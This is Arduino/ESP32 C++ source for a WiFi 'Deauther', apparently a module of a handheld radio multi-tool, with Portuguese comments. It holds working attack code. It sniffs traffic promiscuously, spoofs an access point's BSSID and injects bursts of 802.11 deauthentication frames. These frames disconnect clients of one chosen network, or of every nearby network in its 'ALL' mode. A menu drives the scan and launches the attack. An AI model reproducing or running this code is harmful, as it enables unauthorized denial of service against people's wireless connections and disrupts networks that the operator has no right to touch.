#include "scrbtm.h"

// ==================== DEAUTHER (sniffer-based, targeted) ====================
//
// Obs: override de 'ieee80211_raw_frame_sanity_check' (necessario no core 2.x)
// TODO:(condicional por versao)

// ---- Estruturas 802.11 ----
typedef struct {
  uint8_t frame_control[2];
  uint8_t duration[2];
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint8_t fragment_sequence[2];
} __attribute__((packed)) mac_hdr_t;

typedef struct {
  mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_packet_t;

typedef struct {
  uint8_t frame_control[2];  // 0xC0 0x00 = deauth
  uint8_t duration[2];
  uint8_t station[6];        // addr1: destino (a estacao/cliente)
  uint8_t sender[6];         // addr2: origem (o AP, spoofado)
  uint8_t access_point[6];   // addr3: BSSID
  uint8_t fragment_sequence[2];
  uint16_t reason;
} __attribute__((packed)) deauth_frame_t;

#define DEAUTH_TYPE_SINGLE     0
#define DEAUTH_TYPE_ALL        1
#define NUM_FRAMES_PER_DEAUTH  5
#define DEAUTH_AP_SSID "ScaryRF"
#define DEAUTH_AP_PASS "scary1234"

// Quadro pre-montado (frame_control = deauth; o resto e preenchido em runtime)
deauth_frame_t deauth_frame = {
  { 0xC0, 0x00 }, { 0x00, 0x00 },
  { 0, 0, 0, 0, 0, 0 }, { 0, 0, 0, 0, 0, 0 }, { 0, 0, 0, 0, 0, 0 },
  { 0x00, 0x00 }, 0x0001
};

int deauth_type = DEAUTH_TYPE_SINGLE;
volatile int eliminated_stations = 0;

const wifi_promiscuous_filter_t deauthFilt = {
  WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Callback do sniffer: ao ver trafego do alvo, monta e dispara o deauth.
IRAM_ATTR void deauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
  if (raw->rx_ctrl.sig_len < sizeof(mac_hdr_t)) return; // pacote curto demais
  const wifi_packet_t *packet = (wifi_packet_t *)raw->payload;
  const mac_hdr_t *mac = &packet->hdr;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    // Pacotes destinados ao AP alvo -> deauth do cliente que falou com ele.
    if (memcmp(mac->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    }
  } else {
    // ALL: qualquer estacao falando com qualquer AP (dest == bssid, nao broadcast)
    if ((memcmp(mac->dest, mac->bssid, 6) == 0) &&
        (memcmp(mac->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac->src, 6);
      memcpy(deauth_frame.access_point, mac->dest, 6);
      memcpy(deauth_frame.sender, mac->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    }
  }
}

void startDeauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;
  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    // softAP no canal do alvo: deixa o radio no canal certo e habilita o IF_AP p/ TX
    WiFi.softAP(DEAUTH_AP_SSID, DEAUTH_AP_PASS, WiFi.channel(wifi_number), 1); // hidden
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
  } else {
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&deauthFilt);
  esp_wifi_set_promiscuous_rx_cb(&deauthSniffer);
}

void stopDeauth() {
  esp_wifi_set_promiscuous(false);
}

// ==================== UI ====================
void Deauther() {
  static const CmdEntry selCmds[] = {
    { CMD_OK, "Atk" }, { CMD_RIGHT, "All" }, { CMD_DOWN, "Nav" }, { CMD_LEFT, "Back" }
  };
  static const CmdEntry atkCmds[] = { { CMD_LEFT, "Stop" } };

  // CRITICO: o RCSwitch deixa uma ISR na GPIO 4 (RX) desde o boot, e ela e
  // codigo em FLASH. Ao iniciar o WiFi o cache da flash e desligado (escrita
  // na NVS); se a GPIO 4 oscilar (ruido de RF no CC1101) a ISR dispara e tenta
  // rodar da flash sem cache -> "Cache disabled..." crash. Removemos a ISR
  // e colocamos o RX em modo desconectado antes de ligar o WiFi.
  mySwitch.disableReceive();
  detachInterrupt(digitalPinToInterrupt(RX_PIN));

  // Escaneia em STA (menor pico de corrente). O AP so sobe no ataque SINGLE.
  WiFi.mode(WIFI_STA);

  // ---- Scan ----
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tf);
  u8g2.setCursor(0, 30);
  u8g2.print("Scanning networks...");
  u8g2.sendBuffer();

  WiFi.scanDelete();
  int networkCount = WiFi.scanNetworks(false, true); // ativo, mostra ocultas
  if (networkCount <= 0) {
    showMessage("No networks found");
    delay(1200);
    WiFi.mode(WIFI_OFF);
    return;
  }

  int sel = 0;
  bool redraw = true;

  while (true) {
    if (btnLeft.isPressed()) break; // sai

    if (btnDown.isPressed()) { sel = (sel + 1) % networkCount; redraw = true; delay(150); }
    if (btnUp.isPressed())   { sel = (sel - 1 + networkCount) % networkCount; redraw = true; delay(150); }

    if (redraw) {
      redraw = false;
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tf);
      u8g2.setCursor(0, 12);
      u8g2.printf("Net %d/%d  Ch%d", sel + 1, networkCount, WiFi.channel(sel));
      u8g2.setCursor(0, 28);
      u8g2.print(WiFi.SSID(sel).substring(0, 20));
      drawCommandBar(selCmds, 4);
      u8g2.sendBuffer();
    }

    // OK = ataca a rede selecionada (SINGLE); RIGHT = ataca TODAS (ALL)
    bool single = btnOk.isPressed();
    bool all = btnRight.isPressed();
    if (single || all) {
      startDeauth(sel, single ? DEAUTH_TYPE_SINGLE : DEAUTH_TYPE_ALL, 1);

      // ---- Tela de ataque ----
      unsigned long lastDraw = 0;
      while (!btnLeft.isPressed()) {
        if (millis() - lastDraw > 250) {
          lastDraw = millis();
          u8g2.clearBuffer();
          u8g2.setFont(u8g2_font_6x10_tf);
          u8g2.setCursor(0, 12);
          u8g2.print(single ? "Attacking:" : "Attacking ALL");
          if (single) {
            u8g2.setCursor(0, 24);
            u8g2.print(WiFi.SSID(sel).substring(0, 20));
          }
          u8g2.setCursor(0, 38);
          u8g2.printf("Deauths: %d", eliminated_stations);
          drawCommandBar(atkCmds, 1);
          u8g2.sendBuffer();
        }
        delay(10);
      }

      // Para o ataque e volta para STA (tela de selecao)
      stopDeauth();
      WiFi.softAPdisconnect();
      WiFi.mode(WIFI_STA);
      redraw = true;
    }

    delay(10);
  }

  // ---- Cleanup ----
  stopDeauth();
  WiFi.softAPdisconnect();
  WiFi.mode(WIFI_OFF);
  showMessage("Deauther", "Stopped");
  delay(600);
}
